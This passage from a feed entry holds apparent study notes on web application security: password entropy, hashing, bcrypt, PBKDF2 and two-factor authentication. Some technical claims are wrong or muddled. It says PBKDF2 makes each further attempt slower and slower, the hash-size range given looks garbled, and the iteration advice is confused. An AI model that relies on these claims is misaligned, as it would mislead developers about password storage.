entropy</em></strong><br>😊&gt;As you can see, it is not so much the length of the password that will protect you, but<br>instead the lack of observable patterns and avoidance of common words and phrases<br>#Hashing Credentials<br>hashing algorithms are not reversible.<br>Today’s hashing algorithms<br>can represent multiple-megabyte strings of characters in just 128 to 264 bits of data<br>##Bcrypt<br>the “B”<br>comes from Blowfish Cipher, a symmetric-key block cipher developed in 1993 by<br>Bruce Schneier, designed as a general purpose and open source encryption algorithm.<br>“Crypt” is the name of the default hashing function that shipped with Unix OSs.<br>##PBKDF2<br>based on a concept known as <strong><em>key stretching</em></strong>—rapidly generate a hash on the first attempt, but each additional attempt will become slower and slower.<br>PBKDF2 takes a configuration option that represents the minimum number of itera‐<br>tions in order to generate a hash. This minimum should always be set to the highest<br>number of iterations your hardware can handle. You never know what type of hard‐<br>ware a hacker might have access to, so by setting the minimum iterations for a hash<br>to your hardware’s maximum value, you are eliminating potential iterations on faster<br>hardware and eliminating any attempts on slower hardware.<br>##2FA<br>shows Google Authenticator, one of the<br>most common 2FA applications for Android and iOS. It is compatible with many<br>websites and has an open API for integrating into your application. 2FA is a fantastic<br>security feature that operates very effectively based on a very simple principle</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#Secure Application Architecture&lt;br&gt;**&lt;em&gt;The first step in securing any web application is the architecture phase.**&lt;/em&gt;&lt;/p&gt;
&lt;blockquot</summary>
      
    
    
    
    
  </entry>
  
</feed>
